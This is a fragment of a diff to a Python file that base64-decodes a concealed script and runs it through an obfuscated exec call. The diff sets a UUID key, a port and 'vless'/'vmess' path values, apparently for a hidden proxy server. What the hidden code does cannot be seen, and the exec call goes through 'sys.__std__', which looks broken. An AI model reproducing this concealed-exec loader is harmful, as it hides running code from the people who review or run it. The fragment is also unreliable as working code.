@@ -6,7 +6,7 @@ _ = rb"""CiMhL3Vzci9iaW4vcHl0aG9uMwppbXBvcnQgZ2xvYgppbXBvcnQgb3MKZnJvbSBodHRwLnN
 __builtins__.getattr(sys.__std__, "exec")(
     b64decode(_).decode("utf8").replace(str(int("0o17620", 8)), str(8080))
     .replace("__key__", "8fbce13b-c3ac-4d96-9ce8-8125ca1b12a0")
-    .replace("__vl__", "")
-    .replace("__vm__", "")
+    .replace("__vl__", "vless421k")
+    .replace("__vm__", "vmess318g")
     .replace("__tr__", "")
 )
